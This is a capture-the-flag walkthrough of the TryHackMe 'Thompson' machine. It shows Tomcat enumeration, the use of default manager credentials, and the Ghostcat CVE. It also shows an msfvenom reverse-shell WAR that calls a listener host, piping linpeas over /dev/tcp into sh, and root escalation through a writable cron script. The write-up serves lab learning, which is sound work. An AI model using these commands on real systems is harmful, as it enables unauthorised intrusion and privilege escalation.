## Thompson - boot2root easy

As all boot2roots on THM, the goal is to read the user and root.txt files. The general process is enumeration, exploitation, escalation.

### Enumeration

#### NMAP

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Apache Jserv

The primary purpose of AJP13 is to act as a fast and efficient bridge between two different types of servers in a typical web application setup:

    1. Front-end Web Server: Handles simple tasks like serving static files (HTML, images, CSS) and managing incoming network traffic.
    2. Back-end Application Server: Manages more complex, dynamic content requests, such as those involving Java Servlets or JSP (JavaServer Pages)

Simply put, browsers make a request to the front end web server. The web server then uses apache jserv as a messenger to transfer the request (in binary format) to the backend application server that does the processing (java calls, etc.) and vice versa back to the user.

Researching vulnerabilities for Tomcat 8.5.5 and Jserv, a CVE is found:

https://nvd.nist.gov/vuln/detail/cve-2020-1938


The Ghostcat vulnerability targets versions of Tomcat where the AJP port is enabled by default. Attackers can directly interact with Tomcat through the open port to retrieve configuration files, API tokens, and other data. If the targeted application accepts and stores JSP files, an attacker can even upload a file to perform remote code execution (RCE).

https://www.extrahop.com/resources/detections/cve-2020-1938-ghostcat-exploit


Python script to perform the CVE exploit:

https://www.exploit-db.com/exploits/48143


#### Enumeration with Gobuster

potential files:
build.xml
/docs/appdev/deployment.html
server.html? should have domain name
/manager page uses defualt credentials tomcat and s3cret

```
/build.xml            (Status: 200) [Size: 3376]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

In the manager page I see an interesting subdir at /hgkFDt6wiHIUB29WWEON5PA. Navigating to this page yields a blank screen but no 404.

Also through the manager endpoint, I find a listing of the available directories and also the ability to deploy directories/WAR files.

WAR (web app archive) are essentially bundles of files that are necessary to make a web app.

More information on WAR files:

https://en.wikipedia.org/wiki/WAR_(file_format)

So, we have an ability to upload files, which may be an entry point. The following offers a potential method to gain access but there were issues with packages. Down below a simpler file upload exploitation gives us our initial entry.

https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1


#### Exploitation and Reverse Shell (first flag)

With the WAR file upload vulnerability through the /manager endpoint, we can upload a reverse shell that will give us an initial foothold. To do this we can use msfvenom to create a reverse shell as a .war file:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.129.53 LPORT=1234 -f war -o shell.war
```

After deploying the war file to Tomcat, setting up a listener with nc, navigate to the endpoint of the uploaded war file and the reverse shell comes in.

Upgrade to PTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Steps to perform:

https://www.youtube.com/watch?v=qaJyYxlEBHc&themeRefresh=1

The first flag is in the jack user's account.

#### Escalation (root flag)

run linpeas to enumerate priv esc vectors

```
# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

Linpeas results yields nothing that stands out but provides a good overview of the system (users, env, files, permissions, etc)

Enumerating out current user "tomcat" we find all the files related to the apache web application. tomcat-users.xml:

```
<role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
    <role rolename="manager-gui"/>
    <user username="tomcat" password="s3cret" roles="manager-gui,admin-gui"/>
```

List suid files

```find / -type f -perm -4000 2>/dev/null```

Check gtfobins to see exploitable files if suid is set https://gtfobins.github.io/#+suid

Nothing looks promising on this end.

Maybe the challenge has something to do with the id.sh executable within jack's home directory which runs the id command of the user and adds the output to the test.txt file.

We are able to write to this file but not execute it! The test.txt file is unwritable by us when we try to run id.sh but maybe it is a cronjob that runs automatically that we can write directions to. The last entry in test.txt shows that it was run by root, if this indeed is a cronjob then we will be able to escalate.

After adding the following line to id.sh and waiting a bit, our hypothesis works and the file is a cron job that is run by root:

```echo testing > /tmp/testing```

With the ability to execute commands as root, we have achieved escalation and to get our flag, just add the following line to id.sh and wait:

```cat /root/root.txt > /tmp/root.txt```